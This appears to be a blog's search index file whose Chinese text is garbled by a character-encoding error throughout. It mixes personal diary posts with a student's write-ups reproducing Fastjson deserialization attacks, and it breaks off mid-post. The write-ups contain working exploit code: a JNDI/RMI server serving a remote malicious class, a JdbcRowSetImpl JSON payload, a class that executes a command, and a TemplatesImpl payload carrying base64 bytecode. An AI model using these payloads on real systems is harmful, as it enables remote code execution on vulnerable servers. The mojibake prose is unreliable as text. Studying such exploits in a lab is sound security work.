<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>è‡´æ¯ä¸€ä¸ªåŠªåŠ›çš„äºº</title>
    <link href="/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/"/>
    <url>/2022/03/08/%E8%87%B4%E6%AF%8F%E4%B8%80%E4%B8%AA%E5%8A%AA%E5%8A%9B%E7%9A%84%E4%BA%BA/</url>
    
    <content type="html"><![CDATA[<p>ã€å…¶å®è¶Šé•¿å¤§å°±å‘ç°æƒ³è¦åœ¨ä¸€ä¸ªé¢†åŸŸåšå¥½ï¼Œè¦ä»˜å‡ºå¾ˆå¤šã€‚æœ€è¿‘å­¦ä¹ è™½ç„¶éƒ½æ˜¯å¤ä¹ ä¹‹å‰å­¦çš„ï¼Œä½†æ˜¯è¿˜æ˜¯å­¦äº†å°±å¿˜ï¼Œæ‰‹æ•²ä»£ç è¿˜æ˜¯ä¸å¤Ÿç†Ÿç»ƒã€‚å¯èƒ½ç¡®å®æœ‰äº›å°ç¬¨ï¼Œæ„Ÿè§‰èº«è¾¹çš„äººä¸€æ¬¡å°±å­¦ä¼šäº†ã€‚ç®—äº†ä¹Ÿä¸è¯´è¿™äº›é”¤å¤´ä¸§æ°”çš„è¯ï¼Œç»§ç»­å†²ï¼æ¯•ç«Ÿcuitï¼Œå¤œæ™š11ç‚¹å¤šçš„é“¶å…´å¤§é“ä¸æ­¢åªæœ‰ä½ ã€‚å°±ä¸èŠ±å¤šæ—¶é—´å†™äº†ã€‚å°±æ˜¯ç®€å•è®°å½•ä¸€ä¸‹ã€‚é¡ºä¾¿åæ§½ï¼Œå¯†ç å­¦è€å¸ˆè®²è¯¾çœŸçš„å·®åŠ²ã€‚ï¼ˆæˆ‘ä¸¥é‡æ€€ç–‘ä»–åˆ°åº•ä¼šä¸ä¼šï¼ï¼ï¼ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081834411.jpg" alt="IMG_20220302_232654"></p><p>è¿˜æœ‰è¿˜æœ‰ï¼ï¼ä»Šå¤©ç¬¬ä¸€æ¬¡åƒè¿™ä¸ªä¸œè¥¿ï¼Œæ²¡æƒ³åˆ°è¿˜æŒºå¥½åƒã€‚ä¸‹æ¬¡å›å»è®©å©†å©†ç»™æˆ‘åšè¿™é“èœï¼ï¼ï¼ˆå§‘ä¸”ç§°å®ƒç‹®å­å¤´åŒ…è›‹ã€‚å“ˆå“ˆå“ˆå“ˆå“ˆï¼‰<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081835734.jpg" alt="e87cc39086efc83e178cb12cde2f319"></p>]]></content>
    
    
    <categories>
      
      <category>å†ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å†ç¨‹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®è´å¥³ç”ŸèŠ‚å¿«ä¹</title>
    <link href="/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/"/>
    <url>/2022/03/08/%E5%AE%9D%E8%B4%9D%E5%A5%B3%E7%94%9F%E8%8A%82%E5%BF%AB%E4%B9%90/</url>
    
    <content type="html"><![CDATA[<p>ä¸€å¹´ä¸€åº¦çš„ä¸‰å…«èŠ‚åˆ°å•¦ã€‚å“¦è±æˆ‘å¾—å…ˆå»ä¸Šå¯†ç å­¦äº†ã€‚å¾…ä¼šåœ¨æ¥å¨å¨ä¸¤å¥ã€‚<br>ç–«æƒ…å¤ªéš¾å—äº†ï¼Œå¦‚æœä¸æ˜¯ç–«æƒ…å¯èƒ½æˆ‘ç°åœ¨åœ¨è·Ÿå®è´ç©ã€‚ä»Šå¤©è·Ÿå®è´ç‚¹äº†æ¯å¥¶èŒ¶ï¼Œçœ‹æ ·å­è¿˜æŒºå¼€å¿ƒå¾—ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081824384.png" alt="image-20220308182453321"></p><p>ç¦»æ¸…æ˜èŠ‚è¶Šæ¥è¶Šè¿‘ï¼Œæ„Ÿè§‰å¥½æœŸå¾…ä¸€èµ·å»å³¨çœ‰å±±ã€‚<br>æœ€ååœ¨ç¥å®è´å¥³ç”ŸèŠ‚å¿«ä¹å“Ÿã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å­¦ç”Ÿæ—¶ä»£çš„çˆ±æƒ…</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ±æƒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆJdbcRowSetImplï¼‰</title>
    <link href="/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%88JdbcRowSetImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjsonï¼ˆJNDI-RMI"><a href="#Fastjsonï¼ˆJNDI-RMI" class="headerlink" title="Fastjsonï¼ˆJNDI+RMI)"></a>Fastjsonï¼ˆJNDI+RMI)</h1><p>ğŸ*çš„ï¼ŒçœŸå°±æ½œå…¥JNDIæ˜¯ä¸è¡Œã€‚æ‰‹æ•²è¿˜æ˜¯æ•²ä¸å¯¹ï¼<br>æœ‰ä¸€è¯´ä¸€æ‰¿è®¤äº†ï¼Œè¦ä¸ç„¶ä¸ä¼šå¼„è¿™ä¹ˆä¹…ï¼Œå°±æ˜¯è¿˜æ˜¯æ²¡æœ‰ææ‡‚JNDIæ³¨å…¥ã€‚</p><h2 id="JNDIServer"><a href="#JNDIServer" class="headerlink" title="JNDIServer"></a>JNDIServer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exloit&quot;</span>,<br>                <span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:80/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        registry.bind(<span class="hljs-string">&quot;xsw6a.Exploit&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className, String factory, String factoryLocation)<br></code></pre></td></tr></table></figure><p>å‚æ•°1ï¼š<code>className</code> - è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å</p><p>å‚æ•°2ï¼š<code>classFactory</code> - åŠ è½½çš„<code>class</code>ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°</p><p>å‚æ•°3ï¼š<code>classFactoryLocation</code> - æä¾›<code>classes</code>æ•°æ®çš„åœ°å€å¯ä»¥æ˜¯<code>file/ftp/http</code>åè®®</p><p><strong>å¹¶ä¸”æˆ‘ä»¬è¿™é‡Œæ³¨æ„åˆ°Factoryå‘½åå¿…é¡»å¸¦ä¸ŠåŒ…çš„è·¯å¾„ï¼ˆå°±æ˜¯éœ€è¦å®Œæ•´çš„è·¯å¾„ï¼‰ã€‚</strong>ä¸ç„¶æ— æ³•å¤ç°æˆåŠŸã€‚<br><strong>å½“ç„¶ï¼Œè¦æŠŠä¸€ä¸ªå¯¹è±¡ç»‘å®šåˆ°<code>RMIæ³¨å†Œè¡¨</code>ä¸­ï¼Œè¿™ä¸ªå¯¹è±¡éœ€è¦ç»§æ‰¿<code>UnicastRemoteObject</code>ï¼Œä½†æ˜¯<code>Reference</code>æ²¡æœ‰ç»§æ‰¿å®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å°è£…ä¸€ä¸‹å®ƒï¼Œç”¨ <code>ReferenceWrapper</code> åŒ…è£¹ä¸€ä¸‹<code>Reference</code>å®ä¾‹å¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥å°†å…¶ç»‘å®šåˆ°<code>RMIæ³¨å†Œè¡¨</code></strong></p><p>å½“å»è®¿é—®127.0.0.1&#x2F;Exloit.classçš„æ—¶å€™æ‰¾ä¸åˆ°ã€‚å°±ä¼šå»è®¿é—®æˆ‘ä»¬è®¾ç½®çš„è·¯å¾„å»æ‰§è¡Œæ¶æ„ç±»ä»£ç ã€‚<strong>å¹¶ä¸”ä¼šè°ƒç”¨å…¶ä¸­çš„æ— å‚æ„é€ å‡½æ•°</strong>ï¼Œè¿˜å¯ä»¥åˆ©ç”¨javaçš„staticä»£ç å—æ¥å†™æ¶æ„ä»£ç ï¼Œstaticä»£ç å—çš„ä»£ç åœ¨classæ–‡ä»¶è¢«åŠ è½½è¿‡åå°±ä¼šç«‹å³æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ã€‚</p><h1 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h1><p>è¿™é‡Œå°±è¯´å…³é”®éƒ¨åˆ†ã€‚å› ä¸ºè¿™ä¸ªå¾ˆå¤šæ¨¡å—çš„å‡½æ•°è°ƒè¯•ä¸è¿›å»ã€‚<br>åœ¨ä¹‹å‰<strong>fastjsonåŸºäºTemplatesImplè§¦å‘é“¾ä¸­</strong>ï¼Œæˆ‘ä»¬ç›´æ¥ä»è¿™é‡Œè¿›å»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535811.png" alt="QQæˆªå›¾20220308151631"></p><p>ä¼šè°ƒè¯•å¾ˆä¹…å¾ˆä¹…å¾ˆä¹…ç›´æ¥æ¥åˆ°è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535859.png" alt="QQæˆªå›¾20220308151706"></p><p>å»ºè®®ç›´æ¥è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ã€‚ä½ç½®å¦‚ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535460.png" alt="QQæˆªå›¾20220308151802"></p><p>è·Ÿè¿›è¿™é‡Œåˆçœ‹ä¸åˆ°ã€‚</p><p>å»ºè®®ç›´æ¥æ–­ç‚¹æ¥åˆ°è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535780.png" alt="QQæˆªå›¾20220308152204"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535322.png" alt="QQæˆªå›¾20220308152226"></p><p>è·Ÿè¿›ã€‚**connect()**ã€‚æ¥åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è·Ÿè¿›çœ‹ä¸€ä¸‹this.getDataSourceName()çš„å€¼ã€‚å‘ç°å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081524409.png" alt="QQæˆªå›¾20220308152417"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203081535007.png" alt="QQæˆªå›¾20220308152402"></p><p>æ‰€ä»¥å°±é€ æˆäº†JNDIæ³¨å…¥ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/xsw6a.Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(payload);<br><span class="hljs-comment">//        JSON.parseObject(payload);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ¶æ„ç±»"><a href="#æ¶æ„ç±»" class="headerlink" title="æ¶æ„ç±»"></a>æ¶æ„ç±»</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®°å¾—è‡ªå·±å¼€å¯ä¸€ä¸ª127.0.0.1:80çš„æœåŠ¡ï¼Œå¹¶ä¸”å°†æ¶æ„ç±».classæ”¾å…¥è¿›å»ã€‚æˆ‘çš„ç”µè„‘æœ¬æœºpython3å¯ä»¥å¼€å¯æœåŠ¡ä½†æ˜¯å¼¹ä¸å‡ºè®¡ç®—å™¨ã€‚ä¸çŸ¥é“åŸå› ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆTemplateImplï¼‰</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88TemplateImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjsonï¼ˆTemplatesImpï¼‰"><a href="#Fastjsonï¼ˆTemplatesImpï¼‰" class="headerlink" title="Fastjsonï¼ˆTemplatesImpï¼‰"></a>Fastjsonï¼ˆTemplatesImpï¼‰</h1><p>ä¹‹å‰å¥½å‡ ç¯‡æ–‡ç« éƒ½æ˜¯åŸºäºè§¦å‘æ¶æ„ç±»ï¼ˆTemplatesImpï¼‰è°ƒç”¨getteræ–¹æ³•ã€‚é‚£ä¹ˆåœ¨ä¹‹å‰åˆ†æçš„<strong>Fastjson</strong>ä¸­åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿä¼šè°ƒç”¨getteræ–¹æ³•ã€‚æ‰€ä»¥å°±å¯ä»¥è¿èµ·æ¥äº†ã€‚</p><p><strong>åŸºäº1.2.22-1.2.24ç‰ˆæœ¬</strong></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>å¼„äº†æˆ‘åŠå¤©ï¼Œæ‰å‘ç°è‡ªå·±çš„å¼¹è®¡ç®—å™¨çš„å‘½ä»¤è¾“é”™äº†ã€‚æˆ‘æ— è¯­äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String s=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMeHN3NmEvRmFzdGpzb25FaXZsOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQARRmFzdGpzb25FaXZsLmphdmEMAAgACQcALwwAMAAxAQAIY2FsYy5leGUMADIAMwEAEnhzdzZhL0Zhc3Rqc29uRWl2bAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAANAAQADgANAA8ADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAATAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAYAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABsACAAcAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSON.parseObject(s, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h2><p>å›å¿†ï¼šåœ¨<strong>TemplateImpl</strong>ä¸­æˆ‘ä»¬æ³¨æ„çš„ç‚¹å°±æ˜¯é‚£ä¸‰ä¸ªå‚æ•°å€¼ï¼Œä¸¤ä¸ªä¸ä¸ºç©ºï¼Œä¸€ä¸ªè¦å®ä¾‹åŒ–ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112551.png" alt="QQæˆªå›¾20220307193542"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071936060.png" alt="QQæˆªå›¾20220307193608"></p><p>å¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™é‡Œçš„<strong>name</strong> ã€<strong>bytecode</strong>éƒ½æœ‰è‡ªå·±setæ–¹æ³•ï¼Œè™½ç„¶æ˜¯ç§æœ‰å±æ€§ä½†æ˜¯ä¹Ÿå¯ä»¥èµ‹å€¼ã€‚<br>ä½†æ˜¯ä¸ç¢°å·§è¿™é‡Œçš„<strong>tfactory</strong>æ²¡æœ‰è‡ªå·±çš„setæ–¹æ³•ã€‚<br>ä½†æ˜¯ç¢°å·§çš„æ˜¯fastjsonä¸­</p><p><strong>å¦‚æœå¼€å¯äº†ï¼ŒFeature.SupportNonPublicFieldã€‚åœ¨fastjsonååºåˆ—åŒ–çš„æ—¶å€™ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ— å‚æ„é€ å‡½æ•°ï¼Œå¦‚æœå­˜åœ¨çš„è¯å°±ä¼šç›´æ¥å»è°ƒç”¨setteræ–¹æ³•ç»™å±æ€§èµ‹å€¼ï¼Œè€Œæ²¡æœ‰ setter æ–¹æ³•çš„å±æ€§å¦‚æœå¼€å¯äº†Feature.SupportNonPublicFieldçš„è¯ä¹Ÿä¼šé€šè¿‡åå°„å»ç»™å±æ€§èµ‹å€¼ã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112058.png" alt="QQæˆªå›¾20220307205404"></p><p>è¿™é‡Œåˆ¤æ–­äº†<strong>SupportNonPublicField</strong></p><p>å®åœ¨ä¸æƒ³æˆªå›¾ã€‚æœ€åå°±ä¼šè°ƒç”¨åˆ°getO..æ–¹æ³•ã€‚è§¦å‘TemplatesImplé“¾ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203072112931.png" alt="QQæˆªå›¾20220307211055"></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI+LDAP+JRMP+JNDIï¼ˆäº†è§£ï¼‰</title>
    <link href="/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/"/>
    <url>/2022/03/07/RMI-LDAP-JRMP-JNDI%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p><strong>ä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚</strong></p><p>è¿™é‡Œæˆ‘ä»¬è¦æ¸…æ¥šï¼Œåœ¨å®¢æˆ·ç«¯ä»æœåŠ¡ç«¯ä¼ é€’éƒ½æ˜¯ä»¥å­—èŠ‚åºåˆ—ä¼ é€’çš„ï¼Œæœ€ç»ˆä¸€å®šä¼šç»è¿‡ååºåˆ—åŒ–ã€‚</p><h1 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h1><p>ä¸€ç§åœ¨ä½¿ç”¨RMIçš„è¿‡ç¨‹ä¸­çš„åè®®ï¼Œå¯ä»¥ç»„ç»‡æ•°æ®æ ¼å¼é€šè¿‡TCPè¿›è¡Œä¼ è¾“ï¼Œä»è€Œè¾¾åˆ°RMIã€‚</p><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>ä¸€ç§javaå‘½åå’Œç›®å½•çš„æ¥å£ã€‚è€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“rmiå’Œldapä¹Ÿæ˜¯ç›®å½•æœåŠ¡ç³»ç»Ÿã€‚JNDIçš„æ¥å£ä¸‹æœ‰è®¸å¤šç›®å½•ç³»ç»ŸæœåŠ¡ï¼ˆrmiã€ldapï¼‰ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡åç§°ç­‰å»æ‰¾åˆ°ç›¸å…³çš„å¯¹è±¡ï¼Œå¹¶ä¸”æŠŠå®ƒä¸‹è½½åˆ°å®¢æˆ·ç«¯ã€‚</p><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>åŠ¨æ€åŠ 